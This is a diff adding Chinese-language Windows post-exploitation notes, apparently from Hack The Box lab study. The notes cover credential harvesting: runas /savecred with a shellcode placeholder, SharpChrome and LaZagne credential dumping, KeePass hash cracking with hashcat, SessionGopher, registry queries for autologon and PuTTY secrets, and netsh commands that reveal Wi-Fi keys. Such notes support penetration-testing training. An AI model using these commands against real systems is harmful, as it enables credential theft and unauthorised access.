@@ -64,3 +64,46 @@ Sticky Notes数据地址:
         C:\Program Files\Windows PowerShell\*
 
 
+cmdkey 命令可用于创建、列出和删除存储的用户名和密码
+        https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey
+C:\htb> runas /savecred /user:inlanefreight\bob "SHELLCODE HERE"                        以其他用户身份运行命令
+
+.\SharpChrome.exe logins /unprotect                        提取Chrome中凭证
+        https://github.com/GhostPack/SharpDPAPI
+
+将 .kdbx 文件下载
+提取hash        https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py
+hashcat破解        hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+邮件搜索:
+        https://github.com/dafthack/MailSniper
+
+***
+LaZagne:
+尝试从各种软件中检索凭据。包括网页浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理员工具以及内部密码存储机制（即 Autologon、Credman、DPAPI、LSA 密钥等）。
+可用于运行所有模块、特定模块（如数据库），或针对特定软件（如 OpenVPN）。输出可以保存为标准文本文件或 JSON 格式。
+
+C:\htb> .\lazagne.exe all                        搜索所有，明文
+
+***
+使用 SessionGopher 来提取已保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭据
+C:\htb> Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target WINLPE-SRV01
+
+***
+注册表
+C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+如果必须配置 Autologon，建议使用 Sysinternals 套件中的 Autologon.exe，它会将密码加密为 LSA 密钥 (LSA secret)。
+
+C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
+
+***
+Wifi
+C:\htb> netsh wlan show profile
+C:\htb> netsh wlan show profile WIFINAME key=clear
+
+
+
+
+
